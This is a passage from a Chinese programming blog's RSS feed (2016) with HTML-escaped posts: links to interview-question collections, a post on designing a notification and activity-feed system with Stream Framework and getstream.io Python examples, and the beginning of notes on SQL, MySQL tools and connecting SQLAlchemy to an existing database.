&lt;li&gt;database&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#sql"&gt;sql&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#mysql"&gt;mysql&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#mongodb"&gt;mongodb&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#linux"&gt;linux&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/MaximAbramchuck/awesome-interview-questions#algorithms"&gt;algorithms&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/blakeembrey/code-problems"&gt;code-problems&lt;/a&gt;:Common code and interview problems solved in multiple languages&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/hawx1993/Front-end-Interview-questions"&gt;Front-end-Interview-questions&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/taizilongxu/interview_python"&gt;interview_python&lt;/a&gt;:关于Python的面试题&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/fex-team/interview-questions"&gt;interview-questions&lt;/a&gt;:FEX 面试问题&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/paddingme/Front-end-Web-Development-Interview-Question"&gt;Front-end-Web-Development-Interview-Question&lt;/a&gt;:前端开发面试题大收集&lt;/li&gt;
&lt;li&gt;&lt;a href="http://hit-alibaba.github.io/interview/index.html"&gt;笔试面试知识整理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/qiu-deqing/FE-interview"&gt;FE-interview&lt;/a&gt;:收集的前端面试题和答案&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jimuyouyou/node-interview-questions"&gt;node-interview-questions&lt;/a&gt;:Node.js面试题，侧重后端应用与对Node核心的理解&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/ChenYilong/iOSInterviewQuestions"&gt;iOS面试题集锦&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/envyfan/AndroidReview"&gt;AndroidReview&lt;/a&gt;:Adnroid面试复习&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/arialdomartini/Back-End-Developer-Interview-Questions"&gt;Back-End-Developer-Interview-Questions
&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/monklof/Back-End-Developer-Interview-Questions"&gt;Back-End-Developer-Interview-Questions&lt;/a&gt;:后端开发面试题&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/NoonTechnology/interview_summarize"&gt;interview_summarize&lt;/a&gt;:面试总结&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;名企面试题&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://coolshell.cn/articles/3345.html"&gt;140个Google的面试题&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 14 Jun 2016 00:00:00 +0000</pubDate><guid>tag:,2016-06-14:about-interview.html</guid><category>code</category></item><item><title>notification system思路、概念与实现</title><link>/notification-system-thinking-concept-and-Implementation.html</link><description>&lt;h1&gt;试水&lt;/h1&gt;
&lt;p&gt;水挺深，撸起你的裤管&lt;/p&gt;
&lt;h3&gt;缘起&lt;/h3&gt;
&lt;p&gt;最初我想为Open edX实现一套消息系统（Notification system）。通过浏览&lt;a href="https://github.com/edx"&gt;官方库&lt;/a&gt;，我们发现，官方在做类似的事:&lt;a href="https://github.com/edx/notifier"&gt;notifier&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;notifier is a django application for edX platform notifications&lt;/p&gt;
&lt;p&gt;It currently sends daily digests of new content to subscribed forums users, with a goal of eventually supporting real-time and batched notifications of various types of content across various channels (e.g. SMS).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;由此可知这个库，最终会变得real-time and powerful（多种通知方式）&lt;/p&gt;
&lt;p&gt;但目前而言，似乎偏弱，且只能提供论坛消息通知，且是以邮件的方式。而我们似乎更习惯站内消息这种通知形式&lt;/p&gt;
&lt;p&gt;至于具体实现，我没细看，猜测是celery+rabbitmq，采用pub/sub模型&lt;/p&gt;
&lt;h3&gt;最初的思路&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;基于redis或者rabbitmq&lt;/li&gt;
&lt;li&gt;使用read-time web相关库&lt;ul&gt;
&lt;li&gt;parse&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/rethinkdb/rethinkdb"&gt;rethinkdb&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;meteor&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;看edx的&lt;a href="https://github.com/edx/notifier"&gt;notifier&lt;/a&gt;实现&lt;/li&gt;
&lt;li&gt;改造IM&lt;ul&gt;
&lt;li&gt;&lt;a href="http://kexun.github.io/2016/04/08/%E9%80%9A%E8%BF%87%E7%AC%AC%E4%B8%89%E6%96%B9Im%E7%B3%BB%E7%BB%9F%E6%94%B9%E9%80%A0%E7%A7%81%E4%BF%A1%E5%8A%9F%E8%83%BD/"&gt;通过第三方IM系统，改造私信功能&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;采用云服务&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;我的需求&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;私信（message）&lt;/li&gt;
&lt;li&gt;站内消息（Announce）&lt;ul&gt;
&lt;li&gt;是系统发送的消息，格式是固定的，特殊对象一般拥有&lt;strong&gt;超链接&lt;/strong&gt;（资源定位符）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;提醒（activities，Remind，类似github消息通知）&lt;ul&gt;
&lt;li&gt;可能涉及关注对象/活动/订阅/&lt;ul&gt;
&lt;li&gt;谁对一样属于谁的事物做了什么操作（someone do something in someone's something）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;分析需求&lt;/h3&gt;
&lt;p&gt;通过万能的google，我们发现这类需求早就有人讨论过啦，以下是我喜欢的讨论&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/f4d7827821f1"&gt;消息系统设计与实现「上篇」&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.jianshu.com/p/6bf8166b291c"&gt;消息系统设计与实现「下篇」&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.zhihu.com/question/22394809"&gt;知乎的消息机制，在技术上如何设计与规划？&lt;/a&gt; ： 知乎工程师的回答&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.zhihu.com/question/20380990/answer/14960006"&gt;网站的消息（通知）系统一般是如何实现的？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://nodex.me/t/29"&gt;newsfeed架构设计和实现&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.csdn.net/article/2013-11-07/2817430-design-decisions-for-scaling-your-high-traffic-feeds"&gt;百万用户时尚分享网站feed系统扩展实践&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;概念篇&lt;/h1&gt;
&lt;p&gt;对Pinterest、Instagram和Fashiolista来说，feed是一个核心组件。
这些系统的共同点在于向用户展示其关注的人的动态，Fashiolista是基于&lt;a href="http://activitystrea.ms/specs/atom/1.0/"&gt;Atom Activity Streams 1.0&lt;/a&gt;（还有个使用json格式的版本)来构建动态数据流的（ps：Atom Activity Streams今年出了&lt;a href="https://www.w3.org/TR/activitystreams-core/"&gt;2.0版本&lt;/a&gt;）&lt;/p&gt;
&lt;h3&gt;feed&lt;/h3&gt;
&lt;p&gt;那么我们首先要搞清楚feed是什么。&lt;/p&gt;
&lt;p&gt;可以参考[Web_feed](https://en.wikipedia.org/wiki/Web_feed&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;On the World Wide Web, a web feed (or news feed) is a data format used for providing users with frequently updated content.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我把它理解为最新讯息，提要）&lt;/p&gt;
&lt;h3&gt;Activities&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://getstream.io/docs/?language=python"&gt;stream&lt;/a&gt;的文档，对我们理解消息系统很有帮助，&lt;a href="http://activitystrea.ms/specs/json/1.0/"&gt;
JSON Activity Streams 1.0&lt;/a&gt;有些抽象，而&lt;a href="https://github.com/tschellenbach/Stream-Framework"&gt;Stream-Framework&lt;/a&gt;名词太多&lt;/p&gt;
&lt;p&gt;而&lt;a href="https://getstream.io/docs/?language=python"&gt;stream&lt;/a&gt;的文档让我们在使用过程中理解消息系统&lt;/p&gt;
&lt;p&gt;一则Activities有以下属性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Actor&lt;/li&gt;
&lt;li&gt;Verb&lt;/li&gt;
&lt;li&gt;Object&lt;/li&gt;
&lt;li&gt;Target &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;举例而言&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Erik is pinning Hawaii to his Places to Visit board.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;我们来拆解这句话，用以上属性积木来构建它&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Actor: "Eric" (User:2)&lt;/li&gt;
&lt;li&gt;Verb: "pin"&lt;/li&gt;
&lt;li&gt;Object: "Hawaii" (Place:42)&lt;/li&gt;
&lt;li&gt;Target: "Places to Visit" (Board:1)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们来看下这个动作用代码来描述&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Instantiate a feed object&lt;/span&gt;
&lt;span class="n"&gt;user_feed_1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;feed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# Add an activity to the feed, where actor, object and target are references to objects (`Eric`, `Hawaii`, `Places to Visit`)&lt;/span&gt;
&lt;span class="n"&gt;activity_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;actor&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;User:2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;verb&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;pin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;object&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Place:42&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;target&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Board:1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="n"&gt;activity_response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;user_feed_1&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_activity&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;activity_data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Using the above fields, you can express any activity!&lt;/p&gt;
&lt;p&gt;意识到这点，我们就理解消息系统啦&lt;/p&gt;
&lt;p&gt;ps：用程序表达现实关系（动作），业务相关的代码通常是模拟现实（关系或者事务），所以表达现实是一种常见的模式&lt;/p&gt;
&lt;h3&gt;其他概念&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;fanout：将动态推送给你的粉丝的过程被称为消息分发&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;参考&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.csdn.net/article/2013-11-07/2817430-design-decisions-for-scaling-your-high-traffic-feeds"&gt;百万用户时尚分享网站feed系统扩展实践&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;实现篇&lt;/h1&gt;
&lt;h3&gt;stream framework&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Stream Framework is a Python library, which allows you to build newsfeed and notification systems using Cassandra and/or Redis.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Examples of what you can build are&lt;ul&gt;
&lt;li&gt;Activity streams such as seen on Github&lt;/li&gt;
&lt;li&gt;A notification system&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;之前的Feedly&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.mellowmorning.com/"&gt;作者博客&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最近我在看stream framework的实现，重点关注redis部分，之后有时间再做分析&lt;/p&gt;
&lt;p&gt;我们先来看下数据在redis里的结构&lt;/p&gt;
&lt;p&gt;&lt;img alt="pin-redis" src="http://7xrc4h.com1.z0.glb.clouddn.com/pin-redis.png" /&gt;&lt;/p&gt;
&lt;h3&gt;demo&lt;/h3&gt;
&lt;p&gt;这是基于stream_framework的一个demo，模仿Pinterest，用户可以发布自己的pin（类似post），其他用户可以follow该用户，并且对喜欢的物品进行点赞&lt;/p&gt;
&lt;p&gt;由于时间久远，该项目无法直接运行，我做了些调整，使其跑在osx下，测试正常&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/wwj718/stream_framework_example"&gt;stream_framework_example&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;首页
&lt;img alt="pin1.png" src="http://7xrc4h.com1.z0.glb.clouddn.com/pin1.png" /&gt;&lt;/p&gt;
&lt;p&gt;信息流&lt;/p&gt;
&lt;p&gt;&lt;img alt="pin2.png" src="http://7xrc4h.com1.z0.glb.clouddn.com/pin2.png" /&gt;&lt;/p&gt;
&lt;p&gt;关注者
&lt;img alt="pin3.png" src="http://7xrc4h.com1.z0.glb.clouddn.com/pin3.png" /&gt;&lt;/p&gt;
&lt;h3&gt;stream&lt;/h3&gt;
&lt;p&gt;当然我们也可以使用stream的服务来构建我们的消息系统,我们跑一个简单的demo&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;stream&lt;/span&gt;
&lt;span class="n"&gt;client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;stream&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;client id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;client secret&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;location&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;us-east&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;chris&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;feed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;chris&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# add an activity, message is a custom field. add as many custom fields as you&amp;#39;d like&lt;/span&gt;
&lt;span class="n"&gt;chris&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_activity&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;
  &lt;span class="s1"&gt;&amp;#39;actor&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;chris&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="s1"&gt;&amp;#39;verb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;add&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="s1"&gt;&amp;#39;object&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;picture:10&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="s1"&gt;&amp;#39;foreign_id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;picture:10&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="s1"&gt;&amp;#39;message&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;This bird is absolutely beautiful. Glad it&lt;/span&gt;&lt;span class="se"&gt;\&amp;#39;&lt;/span&gt;&lt;span class="s1"&gt;s recovering from a damaged wing.&amp;#39;&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="c1"&gt;# jack&amp;#39;s timeline feed follows chris&amp;#39; user feed.&lt;/span&gt;
&lt;span class="n"&gt;jack&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;feed&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;timeline&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;jack&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;jack&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;follow&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;chris&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# read the timeline for jack, chris post will show up here&lt;/span&gt;
&lt;span class="n"&gt;activities&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jack&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;limit&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;results&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="c1"&gt;# read the next page, use id filtering for optimal performance&lt;/span&gt;
&lt;span class="n"&gt;next_activities&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jack&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;limit&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;id_lte&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;activities&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;results&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="c1"&gt;# remove the activity by referencing the foreign_id you provided&lt;/span&gt;
&lt;span class="n"&gt;chris&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;remove_activity&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;foreign_id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;picture:10&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;django demo&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://exampledjango.getstream.io/"&gt;exampledjango&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 08 Jun 2016 00:00:00 +0000</pubDate><guid>tag:,2016-06-08:notification-system-thinking-concept-and-Implementation.html</guid><category>code</category></item><item><title>关系型数据库小结</title><link>/relational-database-summary.html</link><description>&lt;p&gt;平时用ORM偏多，生疏了SQL，周末翻了一遍《SQL必知必会》，也整理了一下相关工具，做个记录&lt;/p&gt;
&lt;h1&gt;关系数据库（Relational database）&lt;/h1&gt;
&lt;p&gt;按照维基百科说法&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;表(关系Relation)是以行(属性Attribate)和列(值组Tuble)的形式组织起来的数据的集合。一个数据库包括一个或多个表 (关系Relation)。例如，可能有一个有关作者信息的名为authors的表(关系Relation)。每列(值组Tuble)都包含特定类型的信息，如作者的姓氏。每行(属性Attribate)都包含有关特定作者的所有信息：姓、名、住址等等。在关系型数据库当中一个表 (关系Relation)就是一个关系，一个关系数据库可以包含多个表(关系Relation)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;安装&lt;/h1&gt;
&lt;p&gt;开源的关系数据库中，PostgreSQL 与MySQL 最为流行。一般使用linux发行版的包管理器就能方便地安装，更多的安装方式可以参考官网&lt;/p&gt;
&lt;h1&gt;客户端&lt;/h1&gt;
&lt;p&gt;关系数据库中，我用MySQL和SQLite偏多，所以列出这两个数据库相关的工具&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.mysql.com/products/workbench/"&gt;MySQL Workbench&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/dbcli/mycli"&gt;mycli&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mesasqlite.en.softonic.com/mac"&gt;MesaSQLite&lt;/a&gt;，本地应用首选是sqlite&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当然更经常地，我偏好在jupyter里使用sqlalchemy来连接数据库&lt;/p&gt;
&lt;h1&gt;SQL&lt;/h1&gt;
&lt;p&gt;《SQL必知必会》（第三版）里的代码:&lt;a href="https://github.com/wwj718/teach-yourself-sql.git"&gt;teach-yourself-sql&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用mycli连接数据库&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;CREATE&lt;/span&gt; &lt;span class="k"&gt;DATABASE&lt;/span&gt; &lt;span class="n"&gt;mytest&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;--创建数据库&lt;/span&gt;
&lt;span class="n"&gt;USE&lt;/span&gt; &lt;span class="n"&gt;mytest&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;--进入数据库&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mysql -u root -D mytest   &amp;lt; /tmp/teach-yourself-sql/create.txt  &lt;span class="c1"&gt;#创建新表&lt;/span&gt;
mysql -u root -D mytest   &amp;lt; /tmp/teach-yourself-sql/populate.txt  &lt;span class="c1"&gt;# 插入数据&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;SHOW&lt;/span&gt; &lt;span class="n"&gt;TABLES&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="c1"&gt;--查看表&lt;/span&gt;
&lt;span class="k"&gt;DESCRIBE&lt;/span&gt; &lt;span class="n"&gt;Customers&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="c1"&gt;--显示表结构&lt;/span&gt;
&lt;span class="k"&gt;select&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="n"&gt;Customers&lt;/span&gt; &lt;span class="k"&gt;limit&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;--查看数据 &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;查询&lt;/h3&gt;
&lt;p&gt;使用pandas做实验，存为ipynb&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/wwj718/teach-yourself-sql/blob/master/SQL.ipynb"&gt;SQL.ipynb&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;todo：用SQLAlchemy实现&lt;/p&gt;
&lt;h1&gt;SQLAlchemy&lt;/h1&gt;
&lt;p&gt;SQLAlchemy是Python社区中最广泛使用的ORM工具，底层而强大&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;SQLAlchemy的理念是，SQL数据库的量级和性能重要于对象集合；而对象集合的抽象又重要于表和行&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;连接已有数据库&lt;/h3&gt;
&lt;p&gt;一般情况下我们已经有数据库了，那么如何将既有数据库和SQLAlchemy对接呢&lt;/p&gt;
&lt;p&gt;可以利用表的反射（Table Reflection）。把它们”导入”进来即可，这时得使用&lt;code&gt;autoload&lt;/code&gt;参数。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;sqlalchemy&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;create_engine&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;MetaData&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Table&lt;/span&gt;
&lt;span class="c1"&gt;#使用mysql，需要安装mysql驱动&lt;/span&gt;
&lt;span class="c1"&gt;#brew install mysql-connector-c（mac）&lt;/span&gt;
&lt;span class="c1"&gt;#sudo apt-get install libmysqlclient-dev （ubuntu）&lt;/span&gt;
&lt;span class="c1"&gt;#pip install MySQL-python&lt;/span&gt;
&lt;span class="n"&gt;engine&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;create_engine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mysql+mysqldb://root@edx_host/edxapp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;echo&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;metadata&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MetaData&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;engine&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
